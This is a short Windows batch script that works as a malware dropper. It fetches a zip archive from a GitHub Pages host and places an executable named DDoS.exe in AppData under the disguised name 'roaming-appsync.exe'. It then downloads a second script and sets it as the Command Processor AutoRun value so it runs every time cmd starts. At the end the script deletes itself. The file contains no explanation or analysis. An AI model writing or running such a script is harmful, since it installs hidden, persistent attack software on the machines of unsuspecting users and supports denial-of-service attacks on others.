@echo off

powershell -command "Invoke-WebRequest 'https://gameplayer-8.github.io/injection/sources/Windows.zip' -OutFile c:\file.zip"
mkdir C:\file-e
powershell -command "Expand-Archive C:\file.zip C:\file-e"

del C:\file.zip

move C:\file-e\DDoS.exe C:\Users\%USERNAME%\AppData\Roaming\roaming-appsync.exe

rmdir C:\file-e /S /Q

powershell -command "Invoke-WebRequest 'https://gameplayer-8.github.io/injection/sources/subprocess-handler.cmd' -OutFile %"USERPROFILE"%\subprocess-handler.cmd"

reg add "HKCU\Software\Microsoft\Command Processor" /v AutoRun ^
  /t REG_EXPAND_SZ /d "%"USERPROFILE"%\subprocess-handler.cmd" /f

call :deleteSelf&exit /b
:deleteSelf
start /b "" cmd /c del "%~f0"&exit /b
